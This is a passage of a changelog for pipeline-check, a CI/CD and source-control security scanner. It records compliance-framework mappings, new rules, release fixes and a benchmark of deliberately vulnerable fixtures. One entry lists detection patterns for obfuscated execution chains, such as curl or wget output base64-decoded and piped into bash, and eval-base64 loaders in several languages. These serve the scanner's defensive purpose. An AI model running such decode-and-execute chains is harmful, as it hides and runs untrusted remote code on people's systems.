  Together with the prior CIS / Scorecard / ESF / NIST 800-53
  / SOC 2 / NIST CSF 2.0 / NIST SSDF backfills, SCM rules now
  have coverage on 9 of the 12 framework standards. Remaining
  gaps: NIST 800-190 (container-focused), S2C2F (OSS-deps
  focused), ``cis_aws_foundations`` and ``cis_kubernetes``
  (intentionally narrow per their floor comments).

- **Added SCM coverage to NIST CSF 2.0 and NIST SSDF.** Two
  more frameworks commonly used for CI/CD compliance gating
  get SCM mappings:
  - **NIST CSF 2.0**: 326/526 → 369/526 (+43 rules, full SCM
    range). PR.PS-06 (Secure software development practices)
    carries branch-protection / review-control / ruleset
    rule-type surfaces; PR.AA-05 / PR.AA-01 / PR.AA-03 carry
    access and identity surfaces; PR.DS-01 / PR.DS-02 carry
    secret-scanning + webhook transport; DE.CM-09 carries
    detection surfaces; GV.SC-05 + PR.PS-05 carry the
    allowed-actions / supply-chain governance surface;
    PR.PS-01 carries configuration-management; RS.MA-01
    carries the private vulnerability reporting channel.
  - **NIST SSDF**: 144/526 → 184/526 (+40 rules, full SCM
    range). The PS.1 family ("Protect all forms of code from
    unauthorized access and tampering") is the workhorse for
    branch-protection / ruleset rule-type surfaces; PS.2.1
    carries signed commits; PW.4.1 / PW.4.4 carry allowed-
    actions governance; PO.5.1 carries environment separation;
    PO.3.2 carries webhook channel security; PW.6.1 carries
    required-workflows; RV.1.1 carries scan and vuln-reporting
    surfaces.

  Together with the prior CIS / Scorecard / ESF / NIST 800-53
  / SOC 2 backfills, SCM rules now have coverage on 7 of the
  12 framework standards. Remaining gaps: NIST 800-190
  (container-focused), PCI DSS v4 (less natural fit), S2C2F
  (OSS-deps focused), SLSA (provenance focused), and
  ``cis_aws_foundations`` / ``cis_kubernetes`` (intentionally
  narrow per their floor comments).

- **Added SCM coverage to NIST 800-53 and SOC 2.** Two
  compliance frameworks commonly used as CI/CD gates had zero
  SCM coverage. SCM-001..040 now map:
  - **NIST 800-53**: 233/526 → 293/526 (+39 rules). SA-15
    (Development Process, Standards, and Tools) carries
    branch-protection / review-control / ruleset rule-type
    concerns; AC-3 / AC-6 carry access enforcement; SI-7 / AU-9
    carry history-integrity surfaces; IA-5 carries credential-
    shaped surfaces (workflow tokens, deploy keys, webhook
    HMAC); SR-3 / SR-4 / SR-11 carry signed-commit and
    allowed-actions surfaces; SA-11 carries SAST gates. SCM-016
    (private vuln reporting) is an incident-response surface
    that 800-53's IR family handles, which isn't currently in
    this standard's control catalog; left unmapped with a
    comment.
  - **SOC 2**: 250/526 → 280/526 (+40 rules, full SCM range).
    CC8.1 (Change Management) carries the branch-protection /
    review-control / ruleset rule-type surface, since SOC 2
    frames source review as authorized-change-before-
    deployment. CC6.1 / CC6.2 / CC6.3 carry logical-access
    surfaces; CC6.7 carries webhook transport; CC6.8 carries
    allowed-actions; CC7.1 / CC7.3 / CC7.4 carry the
    vulnerability and incident surfaces.

- **Backfilled SCM coverage on CIS SSCS, OpenSSF Scorecard, and
  ESF supply chain.** SCM-020..040 (Actions governance,
  environment protection, deploy-keys, webhooks, outside-
  collaborator audit, fork-policy, ruleset enforcement /
  always-bypass / per-rule-type coverage / auto-merge) landed
  OWASP-only across this branch. This commit backfills the
  framework mappings the floor comments in
  ``tests/test_standards.py`` had queued:
  - **CIS SSCS**: 197/526 → 217/526 (+20 rules). SCM-020..040
    map to CIS controls in the 1.x source-code and 5.x
    deployment sections; SCM-026 (webhook channel) has no clean
    CIS fit and is left unmapped with a comment.
  - **OpenSSF Scorecard**: 280/526 → 301/526 (+21 rules).
    SCM-020..040 fold into the Branch-Protection / Code-Review
    / Token-Permissions / Pinned-Dependencies / SAST checks
    Scorecard already evidences via SCM-001..017.
  - **NSA/CISA ESF supply chain**: 293/526 → 326/526 (+33
    rules). First SCM coverage on this framework — the rules
    declared ``esf=`` tags in their definitions all along, but
    the standard's data file had zero SCM mappings. SCM-001..040
    map to ESF-D-CODE-REVIEW for branch-protection / review-
    control concerns, ESF-D-SECRETS for scanning, ESF-D-TOKEN-
    HYGIENE for long-lived credentials, ESF-C-LEAST-PRIV for
    governance scope, and ESF-C-APPROVAL / ESF-C-ENV-SEP for
    environment protection. Six SCM rules (SCM-003 SAST,
    SCM-006/036 signed commits, SCM-016 private vuln reporting,
    SCM-026 webhook, SCM-028 fork policy, SCM-040 code-scanning
    gate) have no clean ESF control fit and are left unmapped
    with a comment explaining why.

- **SCM-032..040 now check that rulesets actually target the
  default branch.** All nine ruleset rule-type checks used to
  iterate active rulesets without consulting
  ``conditions.ref_name`` — a ruleset scoped to ``refs/tags/*``
  or ``refs/heads/release/**`` with the right rule type silently
  passed the check while the default branch had no ruleset-level
  coverage at all (false-pass shape). The new
  ``active_rulesets_targeting_default(snapshot)`` helper in
  ``checks/scm/base.py`` partitions active rulesets into
  ``targeting`` (default-branch-applicable), ``unavailable``
  (detail fetch failed), and ``scoped_away`` (active but not
  applicable to the default branch). Each per-rule-type check
  now iterates only the ``targeting`` bucket and surfaces a new
  failure shape when active rulesets exist but none target the
  default branch:
  - For SCM-032..037 (legacy-BP analogs), the failure message
    names the gap and points to the corresponding legacy
    ``SCM-002 / 006 / 007 / 008 / 009 / 012`` as the
    default-branch carrier.
  - For SCM-038..040 (no legacy analog), the failure message
    names the absent default-branch coverage directly.
  The ``~ALL`` and ``~DEFAULT_BRANCH`` include tokens, exact
  ``refs/heads/<default>`` includes, and fnmatch globs are all
  recognized; an ``exclude`` entry that matches the default
  branch also flips the ruleset into ``scoped_away`` even when
  the include list is broad. ``target == "tag"`` rulesets are
  filtered out (they never apply to branches).

  Behavior change: existing scans against a repo with
  feature-branch- or tag-only rulesets that previously passed
  SCM-032..040 may now fail in this branch. The new finding is
  load-bearing — the previous pass was wrong about the default
  branch's coverage.

## [1.0.4] - 2026-05-12

Skipped v1.0.2 and v1.0.3. Both releases failed at the same step:
the SLSA generator's `softprops/action-gh-release` does a two-call
sequence (create release, upload asset), and the repo's
immutable-releases setting locks the release between those two
calls so the upload fails with "Cannot upload assets to an immutable
release". `publish-pypi` depends on `provenance` succeeding, so no
v1.0.2 / v1.0.3 wheel ever reached PyPI. v1.0.4 ships the same
release content with `release.yml` patched to set the SLSA
generator's `upload-assets: false` — the `pipeline-check.intoto.jsonl`
provenance file is still produced (as a workflow run artifact, so
downstream verifiers can fetch it via the run) and PyPI continues
to receive PEP 740 attestations in-band via the publish action's
`attestations: true` flag.

### Added

- **Per-rule policy-as-code overlay (`--policy NAME` /
  `--list-policies`).** New `pipeline_check/core/policies.py`
  module loads named scan profiles from `./policies/<NAME>.yml` or
  `./.pipeline-check/policies/<NAME>.yml`. Each policy bundles a
  `checks:` whitelist, a `standards:` filter, gate thresholds
  (`gate.fail_on` / `gate.min_grade` / `gate.max_failures` /
  `gate.fail_on_checks`), and per-rule severity overrides
  (`overrides:`). Policy values feed click's `default_map`, so the
  config file, env vars, and explicit CLI flags continue to win on
  conflicts (precedence: defaults < policy < config file < env <
  CLI). `--list-policies` enumerates every discoverable policy
  and exits 0; exits 3 when no policies are found. The `--policy`
  argument is sanitized to reject path traversal (`..` and path
  separators); pass a literal file path to bypass the lookup.
  Per-rule `overrides` merge with the existing
  `tool.pipeline_check.overrides` config block (config-file
  overrides win per-key). Closes the v0.6.0 "deployable in the way
  real teams deploy linters" item from the roadmap. 34 unit tests
  + 9 CLI integration tests lock the contract.
- **`--write-baseline PATH` companion to `--baseline`.** Snapshots
  the current scan's findings to a JSON file in the same shape
  `--output json` emits, so the next run can gate only on new
  issues via `--baseline PATH`. Independent of `--output`: a CI
  lane can emit SARIF for code-scanning while simultaneously
  writing the JSON baseline. Logs `[baseline] wrote N failing
  finding(s) to PATH` to stderr unless `--quiet` is set. Closes
  the missing half of the v0.5.0 auto-baseline item.

- **`ATTEST-005` in-toto Statement subject is missing or unpinned.**
  Fifth rule in the attestation-content pack. Walks every parsed
  in-toto Statement (SLSA provenance + SBOM) and validates the
  ``subject`` array: a missing / empty array, a subject entry with
  no ``digest`` map, or a digest value that's empty / all-zero /
  non-hex / odd-length all fail. A Statement with a placeholder
  subject is structurally unbound to artifact bytes; an attacker
  who can move the signed envelope re-attaches it to a tampered
  image without breaking the signature ("attestation-substitution"
  per the SLSA Statement-Track threat model). Pairs with ATTEST-001
  (builder), ATTEST-002 (source), ATTEST-004 (materials), ATTEST-003
  (SBOM contents) so the full chain of custody is verifiable end to
  end. Severity HIGH. Maps to CICD-SEC-3 + CICD-SEC-9. 14 new tests
  covering empty / missing / placeholder / non-hex / odd-length /
  partial-multi-subject shapes, plus the SBOM-attestation case and
  the end-to-end orchestrator path. The catalog-locked OCI rule
  count rises 12 -> 13; ``nist_csf_2`` floor drops one point
  (denominator-dilution case identical to ATTEST-004's NIST 800-53 /
  S2C2F adjustment).

- **`ATTEST-004` SLSA provenance without resolved-dependencies set.**
  Fourth rule in the attestation-content pack. Reads the canonical
  materials lists on each SLSA provenance attestation (v0.2
  ``predicate.materials``, v1
  ``predicate.buildDefinition.resolvedDependencies``) and fires when
  the list is missing or empty. A trusted-builder image with no
  declared materials gives downstream consumers no chain-of-custody
  for build inputs (base image, source ref, transitive tool chain),
  which defeats SLSA Build-track L2+ and breaks downstream
  vulnerability correlation when an advisory drops. Pairs with
  ATTEST-003 (SBOM-level inputs); both lists are needed for the SLSA
  "isolated, reproducible" claim. Severity MEDIUM. Maps to
  CICD-SEC-3 + CICD-SEC-9. 12 new tests covering both spec versions,
  malformed shapes, multi-attestation cases, and the
  end-to-end orchestrator path.

- **GHA-047 fresh-ref cooldown + CodeArtifact freshness primitive.**
  New GitHub Actions rule flags `actions/*` references pinned to a
  ref published within the cooldown window (default 7 days) so a
  freshly-pushed malicious tag doesn't reach prod the day it lands.
  Backed by a shared CodeArtifact freshness primitive that the AWS
  rule pack reuses for package-version recency checks.

- **Standards-doc generator (`scripts/gen_standards_docs.py`).**
  Renders `docs/standards/<name>.md` from the standards registry
  + rule registry, mirroring the provider-doc generator. Every
  shipped standard now has a regenerated page with per-control
  detail, the checks that evidence it, and a severity legend.
  Hand edits get overwritten on the next regeneration; see the
  CLAUDE.md "Standards-doc generation" section.

### Changed

- **Rule-pack quality backfill (no behavior change).** Three
  documentation passes driven by an audit of the 462 active rule
  modules:

  * **`known_fp` backfill on 14 raw-blob heuristics** that
    shipped without documented FP modes despite using regex
    against free-text. Touched ``ARGO-005``, ``ADO-004``,
    ``ADO-014``, ``BB-002``, ``BB-019``, ``BK-002``, ``BK-003``,
    ``GCB-003``, ``GCB-004``, ``GCB-019``, ``GCB-023``,
    ``DF-003``, ``GHA-013``, ``GHA-032``, ``GHA-046``,
    ``TKN-008``. ``--explain`` and the auto-generated provider
    docs now surface FP modes for all 14.
  * **`exploit_example` backfill on 10 highest-ROI HIGH/CRITICAL
    rules.** Concrete vulnerable-config / attack-payload / safe-
    rewrite snippets land in ``IAM-001``, ``IAM-004``,
    ``CB-001``, ``SSM-001``, ``ADO-002``, ``ADO-019``,
    ``ADO-030``, ``BB-002``, ``ARGO-005``, ``TAINT-007``.
    Each follows the ``GHA-003`` template (vulnerable code,
    attack walk-through, safe variant).
  * **CICD-SEC-8 (Ungoverned Usage of 3rd-Party Services)
    tagging.** Per the OWASP CICD Top 10 spec, action / orb /
    pipe / task marketplaces are direct examples of 3rd-party
    service consumption. Nine rules whose primary surface is
    that exact pattern now carry the SEC-8 mapping alongside
    their existing SEC-3 tag: ``GHA-001``, ``GHA-025``,
    ``GHA-040``..``GHA-043``, ``CC-001``, ``BB-001``,
    ``ADO-001``. SEC-8 coverage rises from 7 to 16 rules,
    better-proportioned with neighbors (SEC-5 at 20, SEC-10 at
    24). Both the rule files' ``owasp=`` tuples and the
    ``standards/data/owasp_cicd_top_10.py`` mappings updated
    in lockstep.

- **`--man` topics rebuilt from the live registries.** The
  `standards`, `autofix`, and `secrets` pages are now generated at
  render time from `standards.available()`,
  `autofix.available_fixers()`, and `_BUILTIN_PATTERNS` respectively,
  so adding a new standard / fixer / detector auto-updates the
  manual. Drift traps in `tests/test_manual.py` enforce coverage.
  Static topics (`gate`, `output`, `lambda`, `explain`, `diff`,
  `inventory`) updated for the six fail conditions, the
  junit/markdown output formats, the current Lambda kwarg
  whitelist, and the explain renderer's full section list.

### Fixed

- Ruff F841 / I001 violations in `tests/test_codeartifact_freshness`.

## [1.0.1] - 2026-05-11

Skipped v1.0.0 — that tag is locked against re-use by the
GitHub immutable-release feature after a failed first attempt
(release.yml's tag-vs-wheel-version check correctly refused to
publish a wheel that still said ``version = "0.5.0"``). 1.0.1
is the first published 1.x version; it carries the same content
the v1.0.0 release commit would have, including the API-stability
commitment for ``pipeline_check.__all__`` and the classifier
promotion to Production/Stable.

### Added

- **Malicious-activity pack: extended obfuscation catalog.**
  ``_malicious.py`` (the shared detector backing GHA-027 / GL-025 /
  BB-025 / ADO-026 / CC-026 / JF-029 / CB-011) grows eleven new
  ``obfuscated-exec`` patterns covering base64 decoders and
  interpreter-side eval primitives the old catalog missed:

  * ``base64 --decode`` (GNU long form) and ``-D`` (BSD uppercase),
    in addition to the existing ``-d``.
  * ``base64 -d <<< "PAYLOAD" | sh`` (Bash here-string decode, no
    ``echo`` / ``printf`` source).
  * ``openssl base64 -d`` and ``openssl enc -base64 -d`` as
    alternative decoders when ``base64`` is filtered.
  * Process substitution: ``bash <(... base64 -d)`` and
    ``source <(curl ... | base64 -d)`` (the ``.`` POSIX alias too).
  * Remote-fetch + decode + execute: ``curl ... | base64 -d |
    bash`` and ``wget -qO- ... | base64 -d | sh``. Distinct from
    GHA-016's curl-pipe hygiene rule because the encoded layer has
    no benign explanation.
  * Decode-then-decompress chains: ``base64 -d | gunzip | bash``
    (also ``zcat``, ``xz -d``, ``bunzip2``).
  * ``tr``-rot13 / character-translation decoders piped into a
    shell.
  * ``echo "..." | rev | bash`` reverse-string decoding.
  * Interpreter-side eval-base64 loaders: Python
    (``base64.b64decode`` / ``codecs.decode(..., 'base64')`` + a
    ``exec`` / ``eval`` / ``compile`` sink, in either order),
    Node.js (``eval(Buffer.from(..., 'base64').toString())`` /
    ``Function(...)`` constructor), Perl
    (``-MMIME::Base64 ... eval(decode_base64(...))``).
  * PowerShell ``IEX ([Convert]::FromBase64String(...))`` for the
    in-language base64 decoder path that doesn't go through
    ``-enc`` argv.

  The shell-name alternation reused across the obfuscation patterns
  is fixed and widened: previously ``(?:ba|d|z|k|t?c)?sh`` matched
  ``dsh`` (not a real shell) but missed ``dash`` (the system shell
  on Debian / Ubuntu); the new ``(?:ba|da|z|k|t?c|a)?sh`` catches
  ``dash`` and adds ``ash`` (Alpine busybox, the default shell in
  ``alpine:*``-derived container build steps). Per-pattern positive
  and FP cases land in ``tests/test_malicious_patterns.py``.

- **GHA-04x PPE pack: GHA-044 / GHA-045 / GHA-046.** Three new
  GitHub Actions rules covering Pipeline Poisoned Execution
  variants that GHA-002 / GHA-010 / GHA-032 don't catch:

  * ``GHA-044`` (build tool runs lifecycle scripts on untrusted-
    trigger workflow) — fires when a ``pull_request_target`` /
    ``workflow_run`` workflow invokes ``npm install`` / ``pnpm
    install`` / ``yarn`` / ``pip install .`` / ``setup.py`` /
    ``make`` / ``mvn`` / ``gradle`` / ``bundle install`` /
    ``composer install`` / ``cargo build`` / ``go generate``.
    Each of those tools auto-executes config-file code
    (``preinstall`` / ``postinstall`` scripts, Makefile targets,
    ``setup.py`` body, Maven plugins, ``build.gradle`` /
    ``init.gradle``, ``build.rs``) that the PR controls, so the
    install step IS the attack. Severity HIGH.
  * ``GHA-045`` (caller-controlled ref input feeds actions/
    checkout) — fires when a ``workflow_dispatch`` /
    ``workflow_call`` workflow takes an input and passes it
    verbatim as ``ref:`` to ``actions/checkout``. The caller
    picks which tree runs with secrets and a write-scope
    ``GITHUB_TOKEN``. Severity HIGH.
  * ``GHA-046`` (manual PR-head fetch on untrusted-trigger
    workflow) — fires when a ``pull_request_target`` /
    ``workflow_run`` workflow materializes the PR head via shell
    (``gh pr checkout``, ``git fetch origin pull/<N>/head``,
    ``git checkout ${{ github.event.pull_request.head.sha }}``,
    or ``git checkout FETCH_HEAD`` after a pull-ref fetch). This
    is the shell-level variant of GHA-002 that bypasses the
    ``actions/checkout`` detector while landing the same
    attacker-controlled bytes. Severity CRITICAL.

  All three map to OWASP CICD-SEC-4 and NIST CSF 2.0 PR.IR-01.
  Catalog: GHA 43 → 46 rules.

### Fixed

- **CodeRabbit review on PR #93.** Three reviewer-flagged regressions
  addressed before cutting v1.0.0:

  * ``release.yml`` SLSA generator pin moved from a commit SHA back
    to its semantic-version tag (``@v2.1.0``). ``slsa-verifier``
    validates the trusted-builder ref in the generated provenance
    against an allow-list of known SLSA generator tags; a SHA pin
    produced an unrecognized ref and broke every downstream
    consumer verification (``slsa-verifier verify-artifact
    --source-uri ...``). The accompanying ``GHA-025`` finding on
    this file is suppressed in ``.pipelinecheckignore`` with the
    same rationale, so the dogfood scan still passes. The earlier
    "pin to match the project's SHA-pin posture" comment was wrong;
    SLSA verification is the one place tag-pinning is the
    deliberate choice.
  * ``dogfood.yml`` ``security-events: write`` permission moved
    out of the ``concurrency:`` block (where it was a no-op) into
    ``permissions:`` so the ``github/codeql-action/upload-sarif``
    step can actually upload findings to GitHub code scanning.
    Without this, the SARIF upload had been silently running
    unauthorized.
  * ``GHA-044`` (build-tool PPE) regex widened to accept long-form
    pip flags: ``pip install --editable .``, ``--no-deps``,
    ``--user``, ``--prefix=/opt`` (with both space- and ``=``-
    separated values), and any mix of short / long flags. Previous
    pattern only accepted single-dash options, missing common
    forms used in CI. New test cases lock the expanded surface.

- **``docs/usage.md`` digest-pin wording.** Clarified that the
  Docker ``:sha-<short>`` flavor is a mutable *tag* (still resolves
  through the registry), not a digest pin. Added the
  ``@sha256:<full-digest>`` form for true immutable pinning, with
  a one-liner showing ``docker buildx imagetools inspect`` as the
  way to obtain the digest.

- **CHANGELOG ``[Unreleased]`` duplicate ``###`` subheaders.**
  Acknowledged but deferred: the ``[Unreleased]`` section has
  accumulated multiple ``### Added`` / ``### Changed`` / ``###
  Fixed`` blocks across PRs, tripping markdownlint MD024.
  Consolidating ~2.8k lines of changelog content by hand is high-
  risk for the release cut; the duplicates render correctly and
  the gate doesn't depend on MD024 cleanliness. Tracked for the
  v1.0.x maintenance cycle.

- **SLSA Build L3 wheel provenance.** ``release.yml`` now calls the
  ``slsa-framework/slsa-github-generator`` reusable workflow (pinned
  to ``@v2.1.0``, the tag form required by ``slsa-verifier``) after
  the wheel build. The generator runs in
  GitHub's isolated SLSA builder, reads the SHA-256 hashes of the
  sdist and wheel from the build job's output, generates an in-toto
  SLSA Provenance v1.0 predicate naming the workflow run, and signs
  it via Sigstore using the workflow's OIDC token. Output is a
  ``pipeline-check.intoto.jsonl`` file uploaded as a workflow run
  artifact and, on tag-push runs, attached to the matching GitHub
  release alongside the wheel. PyPI's own PEP 740 attestations
  (already produced by ``gh-action-pypi-publish`` with
  ``attestations: true``) are unchanged, the SLSA file is the
  stronger build-time attestation that downstream consumers verify
  with ``slsa-verifier verify-artifact ... --source-uri
  github.com/dmartinochoa/pipeline-check --source-tag vX.Y.Z``.
  README gains a "Verifying a release" section documenting the
  consumer-side flow. Closes the v0.5.0 reproducible-build roadmap
  item; complements the container image's existing buildx
  ``provenance: true``.

- **SCM provider: GitLab + Bitbucket Cloud platform parity.** New
  ``--scm-platform gitlab`` and ``--scm-platform bitbucket`` modes
  extend the SCM provider beyond GitHub. Each platform ships its
  own ``Http*SCMFetcher`` (stdlib urllib, like the existing
  GitHub one) plus a hydrator that normalizes the platform's
  protection / metadata payload into the GitHub-shaped slots the
  universal rules consume. Universal rules (SCM-001 / -002 / -006
  / -007 / -008 / -009 / -017) fire on every platform; the
  remaining twelve GitHub-only rules (``security_and_analysis``-
  driven, GitHub-only protection knobs) skip on non-GitHub
  snapshots with a "not applicable on PLATFORM" note so the
  operator sees the deliberate skip rather than a silent absence.
  ``--gh-token`` plumbs through as the platform-agnostic token
  override; env-var fallbacks are ``$GITLAB_TOKEN`` /
  ``$BITBUCKET_TOKEN`` for their respective platforms. Resource
  handles carry the platform prefix (``gitlab:group/project``,
  ``bitbucket:workspace/repo``). Documentation table in
  ``docs/providers/scm.md`` enumerates the per-platform rule
  coverage.

- **SCM-017 / SCM-018 / SCM-019: governance follow-up rules.**
  Three new SCM rules close FP/FN gaps the existing pack
  acknowledged:

  * ``SCM-017`` (CODEOWNERS file missing) — pairs with SCM-011.
    The protection-rule toggle is meaningless without a
    CODEOWNERS file. Probes the three canonical paths
    (``.github/CODEOWNERS``, ``CODEOWNERS``, ``docs/CODEOWNERS``)
    via the GitHub contents endpoint.
  * ``SCM-018`` (bypass allowance) — addresses SCM-002's known-FP
    note directly. Fires when
    ``required_pull_request_reviews.bypass_pull_request_allowances``
    lists any users / teams / apps; surfaces the counts so the
    operator can locate the bypass entries.
  * ``SCM-019`` (push restrictions allowlist) — audit-style.
    Fires when the ``restrictions.users`` list on the default
    branch protection rule names individual user accounts (as
    opposed to teams / apps). Personal-account compromise on a
    listed user maps directly to a direct push on the protected
    branch.

  Catalog: SCM 16 → 19 rules.

- **GHA-04x action-reputation pack: GHA-041 / GHA-042 / GHA-043.**
  Three new GHA rules backed by a new ``--resolve-remote`` opt-in
  fetcher path that pulls per-action GitHub repo metadata. The
  fetcher (``_action_reputation.ActionMetadataFetcher``) wraps the
  SCM provider's existing ``HttpSCMFetcher`` for the raw JSON
  fetch, dedupes by ``owner/repo`` so a workflow that references
  ``actions/checkout`` 20 times produces a single API call, and
  populates ``GitHubContext.action_metadata`` for the rules to
  consume.

  * ``GHA-041`` (single-maintainer action) — fires when an action's
    upstream repo has exactly one contributor. The single-
    maintainer pattern was central to the blast radius of the
    tj-actions / reviewdog March 2025 compromises.
  * ``GHA-042`` (very-young action repo) — fires when the upstream
    repo is younger than 90 days. Typosquat / impersonation
    detection.
  * ``GHA-043`` (low-star + sensitive permission) — fires when an
    action with fewer than 25 stars runs in a job that grants
    ``contents`` / ``packages`` / ``id-token`` / ``actions`` /
    ``deployments`` write access. The combination is the
    canonical compromised-action vector.

  When ``--resolve-remote`` is off the rules pass silently with a
  discovery nudge in the description; failed fetches per action
  land in ``ctx.warnings`` and the corresponding rule skips that
  action. Catalog: GHA 40 → 43 rules.

- **Container image: manual publish to GHCR + Docker Hub.** New
  ``Dockerfile`` (multi-stage, ``python:3.12-slim`` base, non-root
  ``scanner`` user, ``ENTRYPOINT ["pipeline_check"]``) and matching
  ``.dockerignore`` so the wheel build context stays under a few MB.
  New ``.github/workflows/docker-publish.yml`` is ``workflow_dispatch``-
  only and builds ``linux/amd64`` + ``linux/arm64`` via buildx +
  QEMU. ``docker/metadata-action`` emits three tag flavors per image
  (version from ``pyproject.toml``, short-SHA, and ``latest`` when
  the run targets ``master``) and pushes them to
  ``ghcr.io/dmartinochoa/pipeline-check`` and
  ``docker.io/<DOCKERHUB_USERNAME>/pipeline-check`` in a single
  build. SLSA build provenance and an SBOM are attached to each
  manifest, keeping parity with ``release.yml``'s CycloneDX SBOM
  for the wheel. After the push, ``docker/scout-action`` runs
  ``docker scout cves`` against the pushed digest, fails the job
  on any new critical or high CVE (mirroring ``release.yml``'s
  ``pip-audit --strict`` posture for the wheel), and uploads
  SARIF to the repo's Security tab via ``codeql-action/upload-sarif``.
  GHCR auth uses the built-in ``GITHUB_TOKEN``; Docker Hub requires
  two new repo secrets (``DOCKERHUB_USERNAME``, ``DOCKERHUB_TOKEN``)
  before the first run, and Scout authenticates through the same
  Docker Hub login.

- **Bench: SCM provider routing + 6th case (cross-provider with
  SCM).** ``bench/run.py`` now detects ``scm_config.json`` +
  ``scm/`` fixture directories per case and routes the SCM
  provider via ``DiskSCMFetcher``, so cases that exercise the
  GitHub-API-driven rules can run hermetically (no network, no
  token). Fixture format mirrors ``--scm-fixture-dir``: JSON
  files matching API endpoint paths with ``/`` collapsed to
  ``_`` (e.g. ``repos_octocat_demo-app.json``); omitting an
  endpoint's file means the fetcher returns ``None``, which
  most rules treat as "feature not enabled" — same behavior as
  a real 404.

  New 6th case ``unprotected-mutable-image`` demonstrates the
  end-to-end XPC-008 chain: a GitHub repo with no protection
  rule on the default branch (SCM-001 fires because the SCM
  fixture omits the protection JSON file) plus a Dockerfile
  with a floating-tag ``FROM`` (DF-001). The chain engine
  composes them into XPC-008 (unreviewed source ships mutable
  runtime image), proving the SCM provider participates in
  pipeline-check's correlation tier — not just the rule pack —
  and that the bench surface exercises it end-to-end on a
  hermetic fixture.

  Recall: 100 % across all 6 cases (22 / 22 expected check_ids
  fire). README updated with the SCM fixture format docs.

- **Bench: chain-engine coverage + 5th case (cross-provider).**
  ``bench/run.py`` now evaluates the chain engine on the union
  of every per-provider scan, so chain check_ids
  (``AC-NNN`` / ``XPC-NNN``) become first-class entries in
  ``expected.txt``. Asserting a chain in a case proves that
  case exercises pipeline-check's correlation tier (the
  project's wedge), not just the rule pack.

  Existing cases that naturally fire chains gained their
  assertions:

  * ``kubernetes-blast-radius`` adds ``AC-011`` (Kubernetes
    Cluster Takeover via hostPath + cluster-admin).
  * ``literal-credentials`` adds ``AC-005`` (Unsigned Artifact
    to Production).

  New 5th case ``cross-provider-floating-image`` demonstrates
  ``XPC-002`` (tag mutability across build + runtime — DF-001
  on a Dockerfile + K8S-001 on a Kubernetes manifest in the
  same case). The composite is exactly the kind of finding
  single-rule scanners can't surface.

  Recall: 100% across all 5 cases (19 / 19 expected check_ids
  fire). Catches a regression in either the rule pack OR the
  chain engine.

- **Vulnerable-by-design benchmark scaffold (`bench/`).** The
  "single biggest credibility move available to a low-popularity
  OSS scanner" the v0.4 review called out, now landed. Each case
  under ``bench/cases/`` is a self-contained intentionally-
  vulnerable repo slice anchored to a real attack pattern, with
  a hand-curated ``expected.txt`` listing the check_ids
  pipeline-check is asserted to fire on. ``bench/run.py``
  iterates every case, runs the scanner via the in-process API
  (no subprocess overhead), and prints a recall table.

  Initial cases (4):

  * ``unpinned-supply-chain`` — ``GHA-001`` (tag-pinned
    actions) + ``DF-001`` (floating-tag image) + ``DF-002``
    (root user). Anchored to the tj-actions/changed-files
    CVE-2025-30066 March 2025 incident.
  * ``pwn-request`` — ``GHA-002`` (pull_request_target +
    PR-head checkout) + ``GHA-003`` (script injection) +
    ``GHA-019`` (token persistence to artifact). Anchored to
    the GitHub Security Lab "Preventing pwn requests" 2020
    write-up.
  * ``literal-credentials`` — ``GHA-008`` (AWS keys + GitHub
    PAT pasted into env) + ``GHA-016`` (curl-pipe install
    script). Anchored to Uber 2016 + GitGuardian Sprawl
    reports.
  * ``kubernetes-blast-radius`` — ``K8S-013`` (hostPath /) +
    ``K8S-005`` (privileged container) + ``K8S-001`` /
    ``K8S-006`` / ``K8S-007`` + ``K8S-020`` (cluster-admin
    binding). Anchored to CVE-2021-25741 + TeamTNT / Kinsing
    cluster-compromise reports.

  Recall: 100% across all 4 cases (14 / 14 expected check IDs
  fire). ``tests/test_bench.py`` runs the harness as a CI
  regression gate so a rule that silently stops firing on a
  case trips the suite.

  ``bench/COMPARISON.md`` documents the eventual cross-scanner
  matrix (vs Zizmor / Poutine / Checkov / KICS / Trivy) — not
  shipped yet, but the case fixtures are designed to feed
  directly into it once the comparison harness lands.

- **XPC-009 cross-tool chain: ingested CVE finding plus mutable
  runtime image reference.** First chain that fires on a SARIF-
  ingested finding (from ``--ingest``) plus a native pipeline-
  check finding. Triggers on any
  ``INGEST-trivy-CVE-* / -trivy-AVD-* / -grype-CVE-* /
  -snyk-SNYK-* / -snyk-CVE-* / -clair-CVE-* / -anchore-CVE-*``
  finding paired with ``DF-001``. The composite is the
  correlation play the ``--ingest`` flag was built around:
  today's known vulnerability AND unbounded future-image
  content. Demonstrates the strategic value of multi-scanner
  ingestion — pipeline-check correlates findings the
  individual tools wouldn't surface alone. New
  ``failing_prefix()`` chain-engine helper supports prefix-
  matched legs (one CVE finding can carry hundreds of distinct
  rule IDs); reserved for ingested findings, native rules
  continue to use exact-match ``failing()``. HIGH composite.
  Catalog: 35 -> 36 chains.

- **Multi-scanner SARIF ingest (`--ingest <file>`).** First-class
  ingestion of external SARIF 2.1.0 documents from Trivy /
  Checkov / Snyk / KICS / CodeQL / any conformant scanner.
  External rules become ``Finding`` rows with synthesized
  ``check_id`` of the form ``INGEST-<tool-slug>-<rule-id>``;
  severity is read from ``properties.security-severity`` (the
  GitHub-Code-Scanning CVSS-like 0..10 score) when present,
  falling back to the SARIF ``level`` enum. Locations carry
  through with file path + line numbers; the rule-definition
  prose populates ``recommendation`` so the operator gets fix
  guidance from the source tool inline.

  After ingestion the chain engine RE-EVALUATES over the
  union of (native + ingested) findings, so the existing
  ``XPC-NNN`` chains can fire on cross-tool compositions —
  e.g., a Checkov ``CKV_AWS_61`` finding plus pipeline-check's
  ``DF-001`` becomes a richer composite than either tool would
  surface alone. Repeat ``--ingest`` for multiple feeds; failures
  to parse a file (malformed JSON, missing ``runs``, oversized
  body) surface as warnings on stderr without crashing the scan.

  Caps: 25 MiB per file, 5,000 results per file. Both
  configurable via the public ``parse_sarif_file`` /
  ``parse_sarif_text`` API surface in
  ``pipeline_check.core.sarif_ingest``. Pure data, no network.

  Closes the strategic Tier 2 gap nobody in the OSS space
  currently fills: pipeline-check becomes the correlation tier
  even where another tool owns primary detection. 33 unit tests
  cover the parser contract; 5 CLI integration tests cover the
  end-to-end flag behavior.

- **XPC-008 cross-provider chain: unreviewed source ships a
  mutable runtime image.** Fifth SCM-touching chain. Fires when
  ``SCM-001`` (no branch protection rule) or ``SCM-007``
  (force-pushes allowed) failure pairs with ``DF-001``
  (Dockerfile ``FROM`` not digest-pinned) in the same
  multi-provider scan. The composite extends the SCM provider's
  reach beyond GHA-only chains: an insider can land a tampered
